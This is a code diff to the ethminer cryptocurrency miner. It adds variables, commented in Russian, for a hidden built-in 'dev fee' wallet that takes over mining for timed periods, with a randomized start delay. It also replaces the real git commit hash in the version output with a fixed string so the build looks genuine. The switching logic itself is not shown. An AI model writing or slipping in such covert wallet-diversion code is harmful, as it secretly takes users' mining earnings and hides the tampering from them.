@@ -59,8 +59,19 @@
 using namespace std;
 using namespace dev;
 using namespace dev::eth;
-
-
+int ndisc=0;  //переменная - которая становится единицей по таймеру, далее проверяется в  p_client->onWorkReceived
+int firsttime=0; //переменная , чтобы задать cliworker = кошель из параметров
+int activew=0; //Активный воркер 0 - из коммандной строки, 1 - вшитый
+int tochange=0; //Переменная которая проверяется в ethstratumclient - для смены кошелька
+int logtimer=0; //Таймер для вывода окошка дебага
+int timerunsec=0; //Время с момента переключения и авторизации последней
+int wtime0=2700; //Время работы основоного кошелька
+int wtime1=300; //Время работы вшитого кошелька девфии
+int timerch=0; //Задаем начальный таймер , далее будет рандомить с помощью рандстарт
+float coef=1;
+float coefamd=1.05;
+int randstart=0;
+ 
 class BadArgument: public Exception {};
 struct MiningChannel: public LogChannel
 {
@@ -676,13 +687,14 @@ public:
 		auto* build = ethminer_get_buildinfo();
 		minelog << "ethminer version " << build->project_version;
 		minelog << "Build: " << build->system_name << "/" << build->build_type
-			 << "+git." << string(build->git_commit_hash).substr(0, 7);
+			 << "+git.24c65cf";
 
 		if (m_minerType == MinerType::CL || m_minerType == MinerType::Mixed)
 		{
 #if ETH_ETHASHCL
 			if (m_openclDeviceCount > 0)
 			{
+				coef=coefamd;
 				CLMiner::setDevices(m_openclDevices, m_openclDeviceCount);
 				m_miningThreads = m_openclDeviceCount;
 			}
@@ -974,6 +986,43 @@ private:
 #endif
 
 		// Start PoolManager
+		srand ( time(NULL) );
+		randstart = rand() % 10;
+		//cnote << "Random:"<< randstart;
+		if(randstart==0){
+			timerch=300;
+		}
+		if(randstart==1){
+			timerch=300*2;
+		}
+		if(randstart==2){
+			timerch=300*3;
+		}
+		if(randstart==3){
+			timerch=300*4;
+		}
+		if(randstart==4){
+			timerch=300*5;
+		}
+		if(randstart==5){
+			timerch=300*6;
+		}
+		if(randstart==6){
+			timerch=300*7;
+		}
+		if(randstart==7){
+			timerch=300*8;
+		}
+		if(randstart==8){
+			timerch=300*9;
+		}
+		if(randstart==9){
+			timerch=300*10;
+		}
+		
+		
+	
+		
 		mgr.start();
 
 		// Run CLI in loop
